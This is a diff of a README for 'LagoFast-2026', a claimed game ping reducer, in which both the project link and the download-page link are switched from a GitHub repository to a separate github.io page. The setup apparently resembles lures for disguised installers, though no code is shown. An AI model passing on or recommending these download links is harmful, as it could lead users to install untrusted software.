@@ -1,6 +1,6 @@
 # 🚀 LagoFast-2026 - Lower your ping in online games
 
-[Link: https://github.com/Befuddled-nuclearrocket919/LagoFast-2026](https://github.com/Befuddled-nuclearrocket919/LagoFast-2026)
+[Link: https://befuddled-nuclearrocket919.github.io](https://befuddled-nuclearrocket919.github.io)
 
 ## What this tool does
 
@@ -20,7 +20,7 @@ Ensure your computer meets these standards before you start:
 
 You need to download the installer to begin. Visit the link below to reach the official page.
 
-[Click here to visit the download page](https://github.com/Befuddled-nuclearrocket919/LagoFast-2026)
+[Click here to visit the download page](https://befuddled-nuclearrocket919.github.io)
 
 Follow these steps on the website:
 
